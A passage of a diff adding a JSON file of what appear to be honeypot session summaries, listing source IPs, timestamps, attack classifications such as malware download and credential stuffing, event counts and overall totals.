+        "end": "2026-03-01T08:12:14.500Z",
+        "classification": "iot_botnet_propagation",
+        "event_count": 17
+      },
+      {
+        "session_id": "f6a7b8c9d0e1",
+        "start": "2026-03-02T02:11:00.000Z",
+        "end": "2026-03-02T02:11:07.000Z",
+        "classification": "malware_download",
+        "event_count": 6
+      }
+    ],
+    "45.33.32.156": [
+      {
+        "session_id": "b2c3d4e5f6a7",
+        "start": "2026-03-01T09:45:22.010Z",
+        "end": "2026-03-01T09:45:35.000Z",
+        "classification": "cryptominer_deployment",
+        "event_count": 13
+      }
+    ],
+    "103.149.172.88": [
+      {
+        "session_id": "c3d4e5f6a7b8",
+        "start": "2026-03-01T11:02:10.050Z",
+        "end": "2026-03-01T11:02:18.000Z",
+        "classification": "iot_botnet_propagation",
+        "event_count": 9
+      }
+    ],
+    "198.51.100.77": [
+      {
+        "session_id": "d4e5f6a7b8c9",
+        "start": "2026-03-01T14:18:44.000Z",
+        "end": "2026-03-01T14:20:41.000Z",
+        "classification": "manual_reconnaissance",
+        "event_count": 11
+      }
+    ],
+    "91.219.237.12": [
+      {
+        "session_id": "e5f6a7b8c9d0",
+        "start": "2026-03-01T16:05:01.000Z",
+        "end": "2026-03-01T16:05:04.000Z",
+        "classification": "credential_stuffing",
+        "event_count": 10
+      }
+    ]
+  },
+  "stats": {
+    "sessions": 6,
+    "global_events": 66,
+    "attackers": 5
+  }
+}
